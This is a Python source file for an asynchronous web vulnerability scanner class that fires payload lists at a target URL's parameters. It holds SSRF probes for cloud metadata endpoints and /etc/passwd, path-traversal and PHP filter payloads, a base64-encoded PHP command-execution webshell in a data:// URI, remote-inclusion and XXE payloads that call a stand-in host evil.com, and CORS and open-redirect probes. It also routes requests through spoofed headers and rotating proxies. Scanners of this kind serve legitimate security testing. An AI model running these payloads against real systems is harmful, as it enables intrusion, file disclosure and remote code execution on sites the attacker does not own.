import re
import aiohttp
import asyncio
import ssl
import socket
import dns.resolver
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from ..utils.helpers import LOG
from ..utils.spoofagent import get_spoofed_headers
from ..utils.proxy_manager import shared_proxy_manager

class AdvancedVulnScanner:
    def __init__(self):
        self.visited_urls = set()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
    async def test_ssrf(self, url):
        """Test for Server-Side Request Forgery (local payloads only). Returns detailed finding dict if found, else None."""
        import time
        ssrf_payloads = [
            'http://localhost/', 'http://127.0.0.1/', 'http://[::1]/', 'http://127.127.127.127/',
            'http://127.0.0.1:80/', 'http://127.0.0.1:443/', 'http://127.0.0.1:22/', 'http://0.0.0.0:80/',
            'file:///etc/passwd', 'dict://localhost:11211/', 'gopher://localhost:11211/_',
            'http://169.254.169.254/latest/meta-data/', 'http://metadata.google.internal/', 'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/', 'http://100.100.100.200/', 'http://metadata.aws/',
            'http://metadata.google.internal/computeMetadata/v1/',
        ]
        try:
            parsed = urlparse(url)
            params = dict(pair.split('=') for pair in parsed.query.split('&')) if parsed.query else {}
            for param in params:
                for payload in ssrf_payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    session = await shared_proxy_manager.get_session()
                    try:
                        if session is None:
                            continue
                        async with session.get(url, params=test_params, timeout=5) as response:
                            if response and response.status not in (400, 403, 404):
                                LOG(f"[!] Potential SSRF found with payload: {payload}")
                                return {
                                    'type': 'ssrf',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'context': 'ssrf',
                                    'evidence': f'Status: {response.status}, payload: {payload}',
                                    'details': 'Potential SSRF',
                                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                }
                    except Exception as e:
                        LOG(f"[!] SSRF test error for payload {payload}: {e}")
                        continue
        except Exception as e:
            LOG(f"[!] Error testing SSRF: {e}")
        return None
        
    async def test_open_redirect(self, url):
        """Test for Open Redirect vulnerabilities. Returns detailed finding dict if found, else None."""
        import time
        redirect_payloads = [
            'https://evil.com', '//evil.com', 'https:evil.com', '\\evil.com', '//google.com%2F@evil.com',
            '//google.com@evil.com', '/%09/evil.com', '/%2F/evil.com', '//%5Cevil.com', '/%5Cevil.com',
            '/%2F%5C%2F%67%6F%6F%67%6C%65%2E%63%6F%6D/',
            'javascript://evil.com', 'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
        ]
        try:
            parsed = urlparse(url)
            params = dict(pair.split('=') for pair in parsed.query.split('&')) if parsed.query else {}
            redirect_params = [p for p in params if any(x in p.lower() for x in [
                'redirect', 'url', 'next', 'return', 'target', 'rurl', 'dest', 'destination', 'redir',
                'redirect_uri', 'redirect_url', 'redirect', '/redirect', '/redirect/', 'return', 'return_path',
                'return_to', 'path', 'image_url', 'go', 'goto', 'link', 'data', 'window', 'to', 'out', 'view',
                'dir', 'show', 'navigation', 'open', 'domain', 'callback_url', 'return_url'])]
            for param in redirect_params:
                for payload in redirect_payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    session = await shared_proxy_manager.get_session()
                    try:
                        if session is None:
                            continue
                        async with session.get(url, params=test_params, allow_redirects=False, timeout=5) as response:
                            if response and response.status in [301, 302, 303, 307, 308]:
                                location = response.headers.get('Location', '') if response.headers else ''
                                if 'evil.com' in location or 'javascript:' in location or 'data:' in location:
                                    LOG(f"[!] Open Redirect found with payload: {payload}")
                                    return {
                                        'type': 'open_redirect',
                                        'url': url,
                                        'parameter': param,
                                        'payload': payload,
                                        'context': 'open_redirect',
                                        'evidence': f'Redirected to: {location}',
                                        'details': 'Potential Open Redirect',
                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                    }
                    except Exception as e:
                        LOG(f"[!] Open Redirect test error for payload {payload}: {e}")
                        continue
        except Exception as e:
            LOG(f"[!] Error testing Open Redirect: {e}")
        return None
        
    async def test_cors(self, url):
        """Test for CORS misconfigurations. Returns detailed finding dict if found, else None."""
        import time
        cors_payloads = [
            'https://evil.com', 'null', 'https://evil.com.target.com', 'https://target.com.evil.com',
            'http://localhost', 'http://127.0.0.1', 'http://[::1]',
        ]
        try:
            for payload in cors_payloads:
                session = await shared_proxy_manager.get_session()
                headers = {'Origin': payload, **get_spoofed_headers()}
                try:
                    if session is None:
                        continue
                    async with session.get(url, headers=headers, timeout=5) as response:
                        if not response:
                            continue
                        acao = response.headers.get('Access-Control-Allow-Origin') if response.headers else None
                        acac = response.headers.get('Access-Control-Allow-Credentials') if response.headers else None
                        if acao:
                            if acao == '*' or acao == 'null' or payload in acao:
                                if acac and acac.lower() == 'true':
                                    LOG(f"[!] CORS misconfiguration found with payload: {payload} (credentials allowed)")
                                    return {
                                        'type': 'cors',
                                        'url': url,
                                        'parameter': 'Origin',
                                        'payload': payload,
                                        'context': 'cors',
                                        'evidence': f'Headers: {dict(response.headers)}',
                                        'details': 'CORS misconfiguration (credentials allowed)',
                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                    }
                                else:
                                    LOG(f"[!] CORS misconfiguration found with payload: {payload}")
                                    return {
                                        'type': 'cors',
                                        'url': url,
                                        'parameter': 'Origin',
                                        'payload': payload,
                                        'context': 'cors',
                                        'evidence': f'Headers: {dict(response.headers)}',
                                        'details': 'CORS misconfiguration',
                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                    }
                except Exception as e:
                    LOG(f"[!] CORS test error for payload {payload}: {e}")
                    continue
        except Exception as e:
            LOG(f"[!] Error testing CORS: {e}")
        return None
        
    async def test_ssl_tls(self, url):
        """Test for SSL/TLS vulnerabilities (modern SSL context). Returns detailed finding dict if found, else None."""
        import time
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)

            # Test for weak ciphers using modern context
            try:
                context = ssl._create_unverified_context()
                with socket.create_connection((hostname, port)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cipher = ssock.cipher()
                        if cipher[0] in ['DES', '3DES', 'RC4', 'NULL']:
                            LOG(f"[!] Weak cipher found: {cipher[0]}")
                            return {
                                'type': 'ssl_tls',
                                'url': url,
                                'parameter': 'N/A',
                                'payload': cipher[0],
                                'context': 'weak cipher',
                                'evidence': f'Cipher: {cipher}',
                                'details': 'Weak SSL/TLS cipher',
                                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                            }
            except Exception as e:
                LOG(f"[!] SSL context/cipher error: {e}")
                return {
                    'type': 'ssl_tls',
                    'url': url,
                    'parameter': 'N/A',
                    'payload': 'N/A',
                    'context': 'ssl error',
                    'evidence': str(e),
                    'details': 'SSL context/cipher error',
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                }

            # Test for certificate issues
            try:
                cert = ssl.get_server_certificate((hostname, port))
                x509 = ssl.PEM_cert_to_DER_cert(cert)
                # Add more certificate checks here
            except Exception as e:
                LOG(f"[!] Certificate error: {e}")
                return {
                    'type': 'ssl_tls',
                    'url': url,
                    'parameter': 'N/A',
                    'payload': 'N/A',
                    'context': 'certificate',
                    'evidence': str(e),
                    'details': 'Certificate error',
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                }

        except Exception as e:
            LOG(f"[!] Error testing SSL/TLS: {e}")
        return None
        
    async def test_subdomain_takeover(self, url):
        """Test for subdomain takeover vulnerabilities. Returns detailed finding dict if found, else None."""
        import time
        try:
            parsed = urlparse(url)
            domain = parsed.netloc
            # Check DNS records
            try:
                answers = dns.resolver.resolve(domain, 'CNAME')
                for rdata in answers:
                    cname = str(rdata.target).rstrip('.')
                    try:
                        dns.resolver.resolve(cname, 'A')
                    except dns.resolver.NXDOMAIN:
                        LOG(f"[!] Potential subdomain takeover: {domain} -> {cname}")
                        return {
                            'type': 'subdomain_takeover',
                            'url': url,
                            'parameter': 'N/A',
                            'payload': cname,
                            'context': 'dns',
                            'evidence': f'CNAME: {domain} -> {cname}',
                            'details': 'Potential subdomain takeover (NXDOMAIN)',
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        }
            except Exception:
                pass
            # Check for common takeover signatures
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                try:
                    async with session.get(url, timeout=5) as response:
                        text = await response.text()
                        takeover_signs = [
                            'There is no app configured at that hostname',
                            'NoSuchBucket',
                            'No Such Account',
                            "You're Almost There",
                            'Domain Not Found',
                            'The specified bucket does not exist',
                            'Repository not found',
                        ]
                        for sign in takeover_signs:
                            if sign in text:
                                LOG(f"[!] Potential subdomain takeover indicators found in {url}")
                                return {
                                    'type': 'subdomain_takeover',
                                    'url': url,
                                    'parameter': 'N/A',
                                    'payload': sign,
                                    'context': 'content',
                                    'evidence': sign,
                                    'details': 'Potential subdomain takeover (content)',
                                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                }
                except Exception:
                    pass
        except Exception as e:
            LOG(f"[!] Error testing subdomain takeover: {e}")
        return None
        
    async def test_file_inclusion(self, url):
        """Test for Local/Remote File Inclusion (LFI/RFI). Returns detailed finding dict if found, else None."""
        import time
        lfi_payloads = [
            '../../../etc/passwd', '....//....//....//etc/passwd', '/../../../etc/passwd', '/etc/passwd',
            'file:///etc/passwd', '/proc/self/environ', '/var/log/apache/access.log', '/var/log/apache2/access.log',
            '/var/log/httpd/access.log', 'php://filter/convert.base64-encode/resource=index.php', 'php://input',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
            '../../../etc/passwd%00', '/etc/passwd%00', '..%2f..%2f..%2fetc%2fpasswd', '..%252f..%252f..%252fetc%252fpasswd',
            'C:\\boot.ini', 'C:/boot.ini', 'C:\\windows\\win.ini',
        ]
        rfi_payloads = [
            'http://evil.com/shell.txt', 'https://evil.com/shell.txt', '//evil.com/shell.txt',
            'http://127.0.0.1/shell.txt', 'ftp://evil.com/shell.txt',
        ]
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            parsed = urlparse(url)
            params = dict(pair.split('=') for pair in parsed.query.split('&')) if parsed.query else {}
            for param in params:
                for payload in lfi_payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    async with aiohttp.ClientSession(connector=connector, headers=get_spoofed_headers()) as session:
                        try:
                            async with session.get(url, params=test_params, timeout=5) as response:
                                if not response:
                                    continue
                                text = await response.text()
                                if any(s in text for s in ['root:x:', 'apache:x:', '[boot loader]', '[fonts]']):
                                    LOG(f"[!] LFI vulnerability found with payload: {payload}")
                                    return {
                                        'type': 'file_inclusion',
                                        'url': url,
                                        'parameter': param,
                                        'payload': payload,
                                        'context': 'lfi',
                                        'evidence': text[:500],
                                        'details': 'Potential LFI',
                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                    }
                        except Exception as e:
                            LOG(f"[!] LFI test error for payload {payload}: {e}")
                            continue
                for payload in rfi_payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    async with aiohttp.ClientSession(connector=connector, headers=get_spoofed_headers()) as session:
                        try:
                            async with session.get(url, params=test_params, timeout=5) as response:
                                if not response:
                                    continue
                                text = await response.text()
                                if '<?php' in text or '<?=' in text:
                                    LOG(f"[!] RFI vulnerability found with payload: {payload}")
                                    return {
                                        'type': 'file_inclusion',
                                        'url': url,
                                        'parameter': param,
                                        'payload': payload,
                                        'context': 'rfi',
                                        'evidence': text[:500],
                                        'details': 'Potential RFI',
                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                    }
                        except Exception as e:
                            LOG(f"[!] RFI test error for payload {payload}: {e}")
                            continue
        except Exception as e:
            LOG(f"[!] Error testing file inclusion: {e}")
        return None
        
    async def test_xxe(self, url):
        """Test for XML External Entity (XXE) vulnerabilities. Returns detailed finding dict if found, else None."""
        import time
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><data>&send;</data>',
        ]
        try:
            headers = {
                'Content-Type': 'application/xml',
                **get_spoofed_headers()
            }
            for payload in xxe_payloads:
                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                    try:
                        async with session.post(url, data=payload, headers=headers, timeout=5) as response:
                            text = await response.text()
                            if 'root:x:' in text or 'apache:x:' in text:
                                LOG(f"[!] XXE vulnerability found")
                                return {
                                    'type': 'xxe',
                                    'url': url,
                                    'parameter': 'N/A',
                                    'payload': payload,
                                    'context': 'xxe',
                                    'evidence': text[:500],
                                    'details': 'Potential XXE',
                                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                }
                    except Exception:
                        continue
        except Exception as e:
            LOG(f"[!] Error testing XXE: {e}")
        return None

    async def crawl(self, url):
        """Dummy crawl method for compatibility. Advanced crawling can be implemented here."""
        LOG(f"[*] AdvancedVulnScanner.crawl called for {url} (no-op)")
        return 